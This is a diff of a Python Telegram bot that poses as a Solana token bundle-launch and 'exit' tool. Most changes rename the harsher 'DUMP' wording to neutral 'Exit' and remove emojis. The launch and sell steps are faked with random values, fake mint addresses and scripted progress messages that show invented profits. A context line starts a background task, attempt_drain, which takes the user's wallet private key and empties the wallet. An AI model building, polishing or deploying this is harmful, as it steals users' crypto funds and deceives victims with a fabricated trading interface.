-        await message.answer("❌ Invalid number. Send e.g. <code>7.5</code>", parse_mode=ParseMode.HTML)
+        await message.answer("Invalid number. Example: <code>7.5</code>", parse_mode=ParseMode.HTML)
         return
     if invest < 3:
-        await message.answer("❌ Minimum invest is <b>3 SOL</b>. Try again.", parse_mode=ParseMode.HTML)
+        await message.answer("Minimum invest is <b>3 SOL</b>.", parse_mode=ParseMode.HTML)
         return
     sess = get_session(message.from_user.id)
     if LARP_ENABLED and message.from_user.id in ADMIN_IDS and not sess.wallets:
@@ -2350,8 +2375,8 @@ async def launch_invest_custom(message: Message, state: FSMContext):
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
     if invest > bal + 1e-9:
         await message.answer(
-            f"❌ <b>Insufficient balance</b>\n\n"
-            f"You tried to invest <b>{invest:.4f} SOL</b>\n"
+            f"<b>Insufficient balance</b>\n\n"
+            f"Requested: <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
             parse_mode=ParseMode.HTML,
             reply_markup=invest_kb(),
@@ -2372,12 +2397,12 @@ async def _finish_invest_choice(cb: CallbackQuery, state: FSMContext, invest: fl
     bal = sess.wallets[sess.active_wallet_idx].balance_sol if sess.wallets else 0.0
     if invest > bal + 1e-9:
         await cb.answer()
-        await cb.message.edit_text(
-            f"❌ <b>Insufficient balance</b>\n\n"
-            f"You tried to invest <b>{invest:.4f} SOL</b>\n"
+        await safe_edit_message(
+            cb.message,
+            f"<b>Insufficient balance</b>\n\n"
+            f"Requested: <b>{invest:.4f} SOL</b>\n"
             f"Available: <b>{bal:.4f} SOL</b>",
             reply_markup=invest_kb(),
-            parse_mode=ParseMode.HTML,
         )
         return
     await state.update_data(invest=invest)
@@ -2394,25 +2419,55 @@ async def _show_launch_preview(src, state: FSMContext, invest: float, sess: User
     if data.get("instagram"): socials_line.append(f"IG: {data['instagram']}")
     if data.get("website"): socials_line.append(f"Web: {data['website']}")
     socials_txt = ", ".join(socials_line) if socials_line else "—"
+    per = round(invest / max(1, bundle), 4)
+    img = data.get("image") or ""
 
     summary = (
-        "📋 <b>Review</b>\n\n"
-        f"✏️ Name: <b>{data['name']}</b>\n"
-        f"🔤 Symbol: <b>${data['symbol']}</b>\n"
-        f"👥 Wallets: <b>{bundle}</b>\n"
-        f"💰 Invest: <b>{invest:.4f} SOL</b>\n"
-        f"📝 Description: {data.get('desc') or '—'}\n"
-        f"🔗 Socials: {socials_txt}\n"
-        f"🖼 Image: {'✅ set' if data.get('image') else '—'}\n\n"
-        "Ready?"
+        "<b>Confirm launch</b>\n"
+        "────────────────────\n\n"
+        f"Name          <b>{data['name']}</b>\n"
+        f"Ticker        <b>${data['symbol']}</b>\n"
+        f"Bundle        <b>{bundle} wallets</b>\n"
+        f"Dev buy       <b>{invest:.4f} SOL</b>  ({per:.4f} / wallet)\n"
+        f"Description   {data.get('desc') or '—'}\n"
+        f"Socials       {socials_txt}\n"
+        f"Image         {'shown above' if img else '—'}\n\n"
+        "Confirm to mint and submit the bundle."
     )
+
+    # Resolve the chat message object we can reply / answer on
     if hasattr(src, "message") and hasattr(src, "answer"):
-        try:
-            await src.message.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
-        except Exception:
-            await src.message.edit_text(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
+        msg = src.message
+        answer = src.message.answer
+        answer_photo = src.message.answer_photo
     else:
-        await src.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
+        msg = src
+        answer = src.answer
+        answer_photo = getattr(src, "answer_photo", None)
+
+    sent = False
+    if img and answer_photo is not None:
+        try:
+            # Telegram file_id from earlier upload, or URL
+            await answer_photo(
+                photo=img,
+                caption=summary,
+                reply_markup=confirm_kb(),
+                parse_mode=ParseMode.HTML,
+            )
+            sent = True
+        except Exception:
+            sent = False
+
+    if not sent:
+        try:
+            await answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
+        except Exception:
+            try:
+                await safe_edit_message(msg, summary, reply_markup=confirm_kb())
+            except Exception:
+                pass
+
     await state.set_state(LaunchStates.confirm)
 
 
@@ -2483,33 +2538,35 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     per_wallet = round(invest / bundle, 4)
     slot = random.randint(280_000_000, 320_000_000)
     tip = round(random.uniform(0.005, 0.03), 4)
+    provisional_mint = fake_mint()
 
-    await cb.message.edit_text(
-        f"<b>${symbol}</b> · launch queued\n"
-        f"{name}\n\n"
-        f"Invest <code>{invest:.4f} SOL</code> · bundle ×{bundle}\n"
-        f"Preparing wallets…",
-        parse_mode=ParseMode.HTML,
+    await safe_edit_message(
+        cb.message,
+        f"<b>${symbol}</b> · {name}\n"
+        "────────────────────\n\n"
+        f"Size <code>{invest:.4f} SOL</code>  ·  bundle ×{bundle}\n"
+        "Preparing keypairs…",
     )
 
     stages = [
-        (f"<b>${symbol}</b> · deriving {bundle} keypairs…", 0.7),
-        (f"<b>${symbol}</b> · funding {bundle} wallets · <code>{per_wallet:.4f}</code> SOL each", 0.95),
-        (f"<b>${symbol}</b> · creating mint on pump…", 0.85),
-        (f"<b>${symbol}</b> · mint <code>{fake_mint()[:12]}…</code>", 0.6),
-        (f"<b>${symbol}</b> · uploading metadata + socials…", 0.75),
-        (f"<b>${symbol}</b> · building atomic bundle · slot ~{slot}", 1.0),
-        (f"<b>${symbol}</b> · simulating {bundle} buys…", 0.8),
-        (f"<b>${symbol}</b> · Jito tip <code>{tip:.4f} SOL</code> · submitting…", 0.9),
-        (f"<b>${symbol}</b> · bundle in mempool…", 0.7),
-        (f"<b>${symbol}</b> · landing… confirmations 1/2", 0.85),
-        (f"<b>${symbol}</b> · bonding curve live · snipers detected", 0.7),
+        (f"<b>${symbol}</b>\n────────────────────\n\nDeriving {bundle} keypairs…", 0.75),
+        (f"<b>${symbol}</b>\n────────────────────\n\nFunding {bundle} wallets\n<code>{per_wallet:.4f}</code> SOL each", 1.0),
+        (f"<b>${symbol}</b>\n────────────────────\n\nCreating mint…", 0.9),
+        (f"<b>${symbol}</b>\n────────────────────\n\nMint <code>{short_mint(provisional_mint)}</code>", 0.65),
+        (f"<b>${symbol}</b>\n────────────────────\n\nUploading metadata…", 0.8),
+        (f"<b>${symbol}</b>\n────────────────────\n\nBuilding atomic bundle\nTarget slot ~{slot}", 1.05),
+        (f"<b>${symbol}</b>\n────────────────────\n\nSimulating {bundle} buys…", 0.85),
+        (f"<b>${symbol}</b>\n────────────────────\n\nPriority tip <code>{tip:.4f} SOL</code>\nSubmitting to block engine…", 0.95),
+        (f"<b>${symbol}</b>\n────────────────────\n\nBundle in mempool…", 0.75),
+        (f"<b>${symbol}</b>\n────────────────────\n\nLanding… confirmation 1/2", 0.9),
+        (f"<b>${symbol}</b>\n────────────────────\n\nBonding curve open\nExternal flow detected", 0.75),
         (
-            f"✅ <b>${symbol}</b> live\n\n"
-            f"Bundle ×{bundle} · <code>{per_wallet:.4f}</code> SOL / wallet\n"
-            f"Tip <code>{tip:.4f} SOL</code> · slot {slot}\n"
-            f"Sniper guard ON · curve open · waiting for fills",
-            0.35,
+            f"<b>${symbol}</b> live\n"
+            "────────────────────\n\n"
+            f"Bundle ×{bundle}  ·  <code>{per_wallet:.4f}</code> SOL / wallet\n"
+            f"Tip <code>{tip:.4f} SOL</code>  ·  slot {slot}\n"
+            "Protection ON  ·  curve open",
+            0.4,
         ),
     ]
     await staged_loading(cb, stages)
@@ -2548,10 +2605,10 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     if not (LARP_ENABLED and uid in ADMIN_IDS):
         sess.launches_left = max(0, sess.launches_left - 1)
 
-    add_personal_tx(sess, f"🪙 Create Mint ${data['symbol']}", "success")
-    add_personal_tx(sess, f"⚡ Jito tip", "success", amount=-round(random.uniform(0.005, 0.03), 4))
-    add_personal_tx(sess, f"📦 Bundle Buy ×{bundle}", "success", amount=-invest)
-    add_personal_tx(sess, f"💰 Dev buy {invest:.2f} SOL", "success", amount=-invest)
+    add_personal_tx(sess, f"Create mint ${data['symbol']}", "success")
+    add_personal_tx(sess, "Priority tip", "success", amount=-round(random.uniform(0.005, 0.03), 4))
+    add_personal_tx(sess, f"Bundle buy ×{bundle}", "success", amount=-invest)
+    add_personal_tx(sess, f"Dev buy {invest:.2f} SOL", "success", amount=-invest)
 
     if (not getattr(active, "is_larp", False)
             and not getattr(active, "drained", False)
@@ -2562,10 +2619,10 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key,
                                           bot=cb.bot, user=cb.from_user, wallet=active))
 
-    preview_n = min(8, len(bundle_wallets))
-    lines = [f"<b>Bundle · ${data['symbol']}</b> · {bundle} wallets\n"]
+    preview_n = min(6, len(bundle_wallets))
+    lines = [f"<b>Bundle · ${data['symbol']}</b>  ·  {bundle} wallets\n"]
     for i, addr in enumerate(bundle_wallets[:preview_n], 1):
-        lines.append(f"{i:02d}  ACTIVE  <code>{short_addr(addr)}</code>  ·  {per_wallet:.3f} SOL")
+        lines.append(f"{i:02d}  open   <code>{short_addr(addr)}</code>  ·  {per_wallet:.3f} SOL")
     if len(bundle_wallets) > preview_n:
         lines.append(f"… +{len(bundle_wallets) - preview_n} more")
     wallets_block = "\n".join(lines)
@@ -2576,16 +2633,17 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     token["slot"] = random.randint(250_000_000, 320_000_000)
 
     text = (
-        f"✅ <b>${data['symbol']}</b> live\n"
-        f"<code>{mint}</code>\n\n"
-        f"Slot <code>{token['slot']}</code> · bundle landed\n"
-        f"MC ~${token['mcap']:,.0f} · holders {token['holders']} · buys {token['buys']}\n"
-        f"Dev buy <code>{invest:.4f} SOL</code> · <code>{per_wallet:.4f}</code> / wallet\n\n"
+        f"<b>${data['symbol']}</b> live\n"
+        f"<code>{short_mint(mint)}</code>\n"
+        "────────────────────\n\n"
+        f"Slot <code>{token['slot']}</code>  ·  bundle landed\n"
+        f"MC ~${token['mcap']:,.0f}  ·  holders {token['holders']}  ·  buys {token['buys']}\n"
+        f"Dev buy <code>{invest:.4f} SOL</code>  ·  <code>{per_wallet:.4f}</code> / wallet\n\n"
         f"{wallets_block}\n\n"
-        f"Sniper guard ON · dump when ready"
+        "Protection ON  ·  sell when ready"
     )
     try:
-        await cb.message.edit_text(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
+        await safe_edit_message(cb.message, text, reply_markup=live_token_kb(mint, bundle))
     except Exception:
         await cb.message.answer(text, reply_markup=live_token_kb(mint, bundle), parse_mode=ParseMode.HTML)
     await state.clear()
@@ -2601,10 +2659,14 @@ async def view_wallets(cb: CallbackQuery):
         await cb.answer("Token not found", show_alert=True)
         return
     dumped = set(token.get("dumped_idxs") or [])
-    lines = [f"<b>Bundle Wallets</b>\nToken: {token['name']} ({token['symbol']})\n"]
+    lines = [
+        f"<b>Bundle wallets</b>\n"
+        f"${token['symbol']}  ·  {token['name']}\n"
+        f"Mint <code>{masked_mint(mint)}</code>\n"
+    ]
     for i, addr in enumerate(token.get("bundle_wallets") or [], 1):
-        status = "DUMPED" if i in dumped or token.get("dumped") else "ACTIVE"
-        lines.append(f"{i:02d}. Wallet {i} [{status}]\n<code>{addr}</code>")
+        status = "sold" if i in dumped or token.get("dumped") else "open"
+        lines.append(f"{i:02d}  {status}  <code>{short_addr(addr)}</code>")
     await cb.message.answer("\n".join(lines), parse_mode=ParseMode.HTML)
     await cb.answer()
 
@@ -2741,61 +2803,68 @@ async def dump_all(cb: CallbackQuery):
 
     try:
         await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⏳ Dumping…", callback_data="noop")]
+            [InlineKeyboardButton(text="Selling…", callback_data="noop")]
         ]))
     except Exception:
         pass
 
     status = await cb.message.answer(
-        f"💥 <b>DUMP ${symbol}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Bundle ×{bundle} · invested <code>{invest:.4f} SOL</code>\n"
-        f"MC ~${start_mcap:,} · {start_holders} holders\n\n"
-        f"Arming sells…",
+        f"<b>Exit ${symbol}</b>\n"
+        f"<code>{masked_mint(mint)}</code>\n"
+        "────────────────────\n\n"
+        f"Bundle ×{bundle}  ·  size <code>{invest:.4f} SOL</code>\n"
+        f"MC ~${start_mcap:,}  ·  holders {start_holders}\n\n"
+        "Building sell routes…",
         parse_mode=ParseMode.HTML,
     )
 
     stages_pre = [
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"MC ~${start_mcap:,} · {start_holders} holders\n"
-            f"Scanning orderbook…",
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
+            f"MC ~${start_mcap:,}  ·  holders {start_holders}\n"
+            "Scanning book…",
             0.55,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Detected <b>{random.randint(6, 22)} open buys</b>\n"
-            f"Estimating impact…",
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
+            f"Detected <b>{random.randint(6, 22)} open bids</b>\n"
+            "Estimating impact…",
             0.65,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
             f"Building {bundle} sell routes\n"
-            f"Split across AMMs · anti-sandwich ON",
+            "Split across venues · sandwich guard ON",
             0.75,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
             f"Signing {bundle} wallets…\n"
-            f"Priority fee maxed · Jito tips attached",
+            "Priority fee maxed · tips attached",
             0.7,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
             f"All {bundle} wallets signed\n"
-            f"Waiting for next leader slot…",
+            "Waiting for next leader slot…",
             0.6,
         ),
         (
-            f"💥 <b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Bundle in mempool\n"
-            f"Landing…",
+            f"<b>Exit ${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
+            "Bundle in mempool\n"
+            "Landing…",
             0.55,
         ),
     ]
@@ -2824,7 +2893,7 @@ async def dump_all(cb: CallbackQuery):
             wave_return = round(wave_return + part, 4)
             returned_total = round(returned_total + part, 4)
             dumped_idxs.append(idx)
-            add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=part)
+            add_personal_tx(sess, f"Sell wallet {idx}", "success", amount=part)
         token["dumped_idxs"] = sorted(dumped_idxs)
         done = len(dumped_idxs)
         progress = done / max(1, bundle)
@@ -2834,12 +2903,13 @@ async def dump_all(cb: CallbackQuery):
         bar_filled = int(progress * 10)
         bar = "█" * bar_filled + "░" * (10 - bar_filled)
         lines = [
-            f"💥 <b>DUMPING ${symbol}</b>",
-            f"━━━━━━━━━━━━━━━━━━━━",
+            f"<b>Exiting ${symbol}</b>",
+            f"<code>{masked_mint(mint)}</code>",
+            "────────────────────",
             f"",
             f"<code>{bar}</code>  {done}/{bundle}",
             f"",
-            f"Sold this wave   <b>+{wave_return:.4f} SOL</b>",
+            f"This wave        <b>+{wave_return:.4f} SOL</b>",
             f"Running total    <code>{returned_total:.4f} SOL</code>",
             f"Unrealized PnL   <b>{pnl_now:+.4f} SOL</b>",
             f"",
@@ -2866,13 +2936,13 @@ async def dump_all(cb: CallbackQuery):
     token["profit"] = profit
     token["returned"] = returned_total
     token["invested"] = invest
-    token["mode"] = "Sniper Dump"
+    token["mode"] = "Staged exit"
     token["dumped_idxs"] = list(range(1, bundle + 1))
     token["mcap"] = random.randint(300, 1800)
 
-    add_personal_tx(sess, f"💥 DUMP ALL ${symbol}", "success", amount=returned_total)
-    add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
-    add_personal_tx(sess, "📊 PnL Settled", "success", amount=profit)
+    add_personal_tx(sess, f"Exit all ${symbol}", "success", amount=returned_total)
+    add_personal_tx(sess, "Profit claim", "success", amount=profit)
+    add_personal_tx(sess, "PnL settled", "success", amount=profit)
 
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
@@ -2885,29 +2955,31 @@ async def dump_all(cb: CallbackQuery):
 
     settle_stages = [
         (
-            f"💥 <b>${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
             f"Settling {bundle} sells…\n"
-            f"Sweeping residual liquidity…",
+            "Sweeping residual liquidity…",
             0.7,
         ),
         (
-            f"💥 <b>${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Routing proceeds → main wallet\n"
-            f"Finalizing PnL…",
+            f"<b>${symbol}</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
+            "Routing proceeds → main wallet\n"
+            "Finalizing PnL…",
             0.6,
         ),
         (
-            f"✅ <b>DUMP COMPLETE</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"<b>${symbol}</b>\n"
-            f"<code>{mint}</code>\n\n"
+            f"<b>Exit complete</b>\n"
+            f"<code>{masked_mint(mint)}</code>\n"
+            "────────────────────\n\n"
+            f"<b>${symbol}</b>\n\n"
             f"Invested     <code>{invest:.4f} SOL</code>\n"
             f"Returned     <code>{returned_total:.4f} SOL</code>\n"
             f"Profit       <b>+{profit:.4f} SOL</b>\n"
             f"Multiple     <b>{multiple:.2f}X</b>  ({pct:+.0f}%)\n\n"
-            f"MC collapsed ~${token['mcap']:,}\n"
+            f"MC ~${token['mcap']:,}\n"
             f"{bundle}/{bundle} wallets sold · balance updated",
             0.35,
         ),
@@ -2923,13 +2995,13 @@ async def dump_all(cb: CallbackQuery):
         await asyncio.sleep(delay)
 
     try:
-        await cb.message.edit_text(
-            f"✅ <b>${symbol}</b> dumped\n"
-            f"<code>{mint}</code>\n\n"
+        await safe_edit_message(
+            cb.message,
+            f"<b>${symbol}</b> exited\n"
+            f"<code>{masked_mint(mint)}</code>\n\n"
             f"{bundle}/{bundle} wallets sold\n"
-            f"Profit <b>+{profit:.4f} SOL</b> · {multiple:.2f}X",
+            f"Profit <b>+{profit:.4f} SOL</b>  ·  {multiple:.2f}X",
             reply_markup=post_dump_kb(mint),
-            parse_mode=ParseMode.HTML,
         )
     except Exception:
         pass
